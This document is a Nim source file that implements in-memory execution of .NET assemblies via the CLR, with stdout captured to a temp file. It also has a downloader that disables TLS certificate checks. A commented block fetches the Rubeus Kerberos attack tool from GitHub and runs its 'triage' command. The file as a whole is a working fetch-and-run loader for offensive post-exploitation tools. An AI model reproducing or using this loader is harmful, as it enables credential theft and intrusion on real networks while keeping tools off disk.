import winim/clr
import os
import httpclient, base64, json, osproc, random, os, strutils, net

#Create dup handles
proc dup(oldfd: FileHandle): FileHandle {.importc, header: "unistd.h".}
proc dup2(oldfd: FileHandle, newfd: FileHandle): cint {.importc,
    header: "unistd.h".}

func convertToByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))


# thanks Clonk from https://forum.nim-lang.org/t/6909
proc executeassembly(assembly_bytes: openarray[byte], args: openarray[string], tmpname: string) : string =
  # input redirection begins
  let tmpFileName = getTempDir() & tmpname
  
  var stdout_fileno = stdout.getFileHandle()
  var stdout_dupfd = dup(stdout_fileno)
  
  var tmp_file: File = open(tmpFileName, fmWrite)
  var tmp_file_fd: FileHandle = tmp_file.getFileHandle()
  
  # dup2 tmp_file_fd to stdout_fileno -> writing to stdout_fileno now writes to tmp_file
  discard dup2(tmp_file_fd, stdout_fileno)
  
  #actual execution
  var dotnetargs = toCLRVariant(args, VT_BSTR)
  var assembly = load(assembly_bytes)
  assembly.EntryPoint.Invoke(nil, toCLRVariant([dotnetargs]))

  # input redirection ends
  tmp_file.flushFile()
  tmp_file.close()
  discard dup2(stdout_dupfd, stdout_fileno)

  result = readFile(tmpFileName)

proc read_file_content(filepath:string):string =
    var filecontent = readFile(filepath)
    return filecontent

proc get_assembly(url: string):string =
    let client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
    let res = client.getContent(url)
    return res

#when isMainModule:
#    var outuot = get_assembly("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x86/Rubeus.exe")
#    var command_output = executeassembly(convertToByteSeq(outuot),["triage"],"tempfile")
#    echo $command_output
#    #echo $outuot
